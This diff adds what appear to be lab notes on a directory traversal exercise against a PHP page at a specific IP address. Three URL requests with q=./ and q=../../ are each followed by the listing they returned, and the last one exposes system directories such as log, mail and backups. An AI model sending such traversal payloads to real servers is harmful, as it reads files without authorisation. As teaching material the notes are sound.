@@ -1,0 +1,39 @@
+1.http://165.227.34.74/directory_traversal_part1.php
+
+Array
+(
+    [0] => .
+    [1] => ..
+    [2] => directory_traversal_part1.php
+    [3] => index.html
+)
+
+2.http://165.227.34.74/directory_traversal_part1.php?q=./ 
+Array
+(
+    [0] => .
+    [1] => ..
+    [2] => directory_traversal_part1.php
+    [3] => index.html
+)
+
+3. http://165.227.34.74/directory_traversal_part1.php?q=../../
+Array
+(
+    [0] => .
+    [1] => ..
+    [2] => backups
+    [3] => cache
+    [4] => crash
+    [5] => lib
+    [6] => local
+    [7] => lock
+    [8] => log
+    [9] => mail
+    [10] => opt
+    [11] => run
+    [12] => snap
+    [13] => spool
+    [14] => tmp
+    [15] => www
+)
